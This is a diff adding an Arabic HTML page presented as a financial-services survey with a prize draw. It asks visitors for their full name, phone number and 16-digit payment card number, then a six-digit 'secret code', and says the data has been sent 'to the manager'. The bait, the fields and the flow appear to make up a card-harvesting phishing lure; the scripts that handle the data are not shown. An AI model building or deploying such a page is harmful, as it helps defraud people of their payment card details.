@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استبيان الخدمات المالية</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- الصفحة الرئيسية -->
+    <div id="home" class="page active">
+        <header>
+            <h1><i class="fas fa-poll"></i> استبيان الخدمات المالية</h1>
+            <p>شارك واستفد من فرصة الفوز</p>
+        </header>
+        
+        <main>
+            <div class="card">
+                <h2><i class="fas fa-gift"></i> 150 هدية مقدمة</h2>
+                <p>شارك في الاستبيان لدخول السحب</p>
+                <button onclick="startSurvey()" class="btn">
+                    ابدأ الاستبيان <i class="fas fa-arrow-left"></i>
+                </button>
+            </div>
+            
+            <div class="stats">
+                <div class="stat">
+                    <i class="fas fa-users"></i>
+                    <span id="participantCount">0</span>
+                    <small>مشارك</small>
+                </div>
+                <div class="stat">
+                    <i class="fas fa-clock"></i>
+                    <span>3</span>
+                    <small>دقائق</small>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- صفحة الاستبيان -->
+    <div id="survey" class="page">
+        <div class="header">
+            <button onclick="goHome()" class="back-btn">
+                <i class="fas fa-arrow-right"></i> رجوع
+            </button>
+            <div class="steps">
+                <span class="step active">1</span>
+                <span class="step">2</span>
+                <span class="step">3</span>
+            </div>
+        </div>
+        
+        <!-- الخطوة 1 -->
+        <div id="step1" class="step-content active">
+            <h2><i class="fas fa-user"></i> معلوماتك</h2>
+            
+            <div class="form-group">
+                <label>الاسم الكامل</label>
+                <input type="text" id="name" placeholder="اكتب اسمك" required>
+            </div>
+            
+            <div class="form-group">
+                <label>رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="05XX XX XX XX" required>
+                <small>يبدأ بـ 05 أو 06 أو 07</small>
+            </div>
+            
+            <div class="form-group">
+                <label>رقم البطاقة</label>
+                <input type="text" id="card" placeholder="16 رقم" maxlength="16" required>
+            </div>
+            
+            <button onclick="nextStep()" class="btn">
+                التالي <i class="fas fa-arrow-left"></i>
+            </button>
+        </div>
+        
+        <!-- الخطوة 2 -->
+        <div id="step2" class="step-content">
+            <h2><i class="fas fa-shield-alt"></i> التحقق</h2>
+            <p>اكتب أي 6 أرقام من خيالك</p>
+            
+            <div class="form-group">
+                <label>الرمز السري</label>
+                <input type="text" id="code" placeholder="مثال: 123456" maxlength="6" required>
+                <small>ليس هناك رمز صحيح، اختر أي أرقام</small>
+            </div>
+            
+            <div class="examples">
+                <p>أمثلة:</p>
+                <button onclick="fillExample('123456')" class="ex-btn">123456</button>
+                <button onclick="fillExample('654321')" class="ex-btn">654321</button>
+                <button onclick="fillExample('999888')" class="ex-btn">999888</button>
+            </div>
+            
+            <button onclick="submitSurvey()" class="btn">
+                إرسال للمدير <i class="fas fa-paper-plane"></i>
+            </button>
+        </div>
+        
+        <!-- الخطوة 3 -->
+        <div id="step3" class="step-content">
+            <div class="success">
+                <i class="fas fa-check-circle"></i>
+                <h2>تم الإرسال! ✅</h2>
+                <p>بياناتك الآن لدى المدير للمراجعة</p>
+                
+                <div class="info-card">
+                    <p><strong>رقم مشاركتك:</strong> <span id="userId">FS-001</span></p>
+                    <p><strong>الحالة:</strong> <span class="status waiting">قيد المراجعة</span></p>
+                </div>
+                
+                <button onclick="goHome()" class="btn">
+                    <i class="fas fa-home"></i> الصفحة الرئيسية
+                </button>
+                
+                <p class="note">
+                    <i class="fas fa-info-circle"></i>
+                    ستتلقى رسالة عند الموافقة
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- الرسائل -->
+    <div id="message" class="message"></div>
+
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
